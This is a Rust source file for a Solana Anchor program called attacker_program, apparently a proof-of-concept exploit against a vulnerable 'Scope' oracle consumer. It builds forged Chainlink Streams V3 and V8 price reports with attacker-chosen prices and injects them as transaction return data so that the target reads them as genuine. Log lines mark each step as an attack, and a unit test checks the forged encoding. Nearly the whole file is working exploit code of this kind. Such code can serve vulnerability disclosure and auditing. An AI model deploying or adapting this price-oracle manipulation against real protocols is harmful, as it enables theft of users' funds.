use anchor_lang::prelude::*;
use chainlink_streams_report::report::v3::{ReportDataV3, FeedID};
use num_bigint::{BigInt, Sign};
use solana_program::program::set_return_data;

declare_id!("Attack11111111111111111111111111111111111");

#[program]
pub mod attacker_program {
    use super::*;

    /// This instruction sets malicious return data that will be interpreted
    /// as a valid Chainlink report by the vulnerable Scope program
    pub fn set_malicious_return_data(
        ctx: Context<SetMaliciousData>,
        target_feed_id: [u8; 32],
        malicious_price: i128,
        malicious_bid: i128,
        malicious_ask: i128,
        observations_timestamp: u32,
    ) -> Result<()> {
        msg!("🔴 ATTACKER: Setting up malicious return data injection");
        msg!("🔴 ATTACKER: Target feed ID: {:?}", target_feed_id);
        msg!("🔴 ATTACKER: Malicious price: {}", malicious_price);
        
        // Create a forged ReportDataV3 that will pass validation
        let forged_report = create_forged_report_v3(
            target_feed_id,
            malicious_price,
            malicious_bid,
            malicious_ask,
            observations_timestamp,
        );
        
        // Encode the forged report
        let encoded_report = forged_report.abi_encode();
        
        msg!("🔴 ATTACKER: Encoded malicious report size: {} bytes", encoded_report.len());
        msg!("🔴 ATTACKER: First 32 bytes of payload: {:?}", &encoded_report[..32.min(encoded_report.len())]);
        
        // Set the return data - this will be the "last writer" in the transaction
        set_return_data(&encoded_report);
        
        msg!("🔴 ATTACKER: ✅ Malicious return data set successfully!");
        msg!("🔴 ATTACKER: Scope will read this data instead of the real Chainlink data");
        
        Ok(())
    }

    /// Alternative attack: Set return data for other report types
    pub fn set_malicious_v8_data(
        ctx: Context<SetMaliciousData>,
        target_feed_id: [u8; 32],
        malicious_mid_price: i128,
        market_status: u32,
        observations_timestamp: u32,
    ) -> Result<()> {
        use chainlink_streams_report::report::v8::{ReportDataV8, FeedID as FeedIDV8};
        
        msg!("🔴 ATTACKER V8: Setting up V8 report injection");
        
        let forged_report = ReportDataV8 {
            feed_id: FeedIDV8(target_feed_id),
            valid_from_timestamp: observations_timestamp,
            observations_timestamp,
            native_fee: BigInt::from(0),
            link_fee: BigInt::from(0),
            expires_at: observations_timestamp + 3600,
            mid_price: BigInt::from(malicious_mid_price),
            bid: BigInt::from(malicious_mid_price - 100),
            ask: BigInt::from(malicious_mid_price + 100),
            market_status,
            last_update_timestamp: observations_timestamp,
        };
        
        let encoded_report = forged_report.abi_encode();
        set_return_data(&encoded_report);
        
        msg!("🔴 ATTACKER V8: ✅ Malicious V8 data injected!");
        
        Ok(())
    }
}

fn create_forged_report_v3(
    feed_id: [u8; 32],
    price: i128,
    bid: i128,
    ask: i128,
    timestamp: u32,
) -> ReportDataV3 {
    ReportDataV3 {
        feed_id: FeedID(feed_id),
        valid_from_timestamp: timestamp,
        observations_timestamp: timestamp,
        native_fee: BigInt::from(0),
        link_fee: BigInt::from(0),
        expires_at: timestamp + 3600, // Valid for 1 hour
        benchmark_price: BigInt::from(price),
        bid: BigInt::from(bid),
        ask: BigInt::from(ask),
    }
}

#[derive(Accounts)]
pub struct SetMaliciousData<'info> {
    /// The attacker can be any signer - no special privileges needed!
    #[account(mut)]
    pub attacker: Signer<'info>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_forged_report_encoding() {
        let feed_id = [1u8; 32];
        let report = create_forged_report_v3(
            feed_id,
            1000000000, // $1000 with 6 decimals
            999000000,  // $999
            1001000000, // $1001
            1234567890,
        );
        
        let encoded = report.abi_encode();
        assert!(!encoded.is_empty());
        
        // Verify it can be decoded back
        let decoded = ReportDataV3::decode(&encoded).unwrap();
        assert_eq!(decoded.feed_id.0, feed_id);
    }
}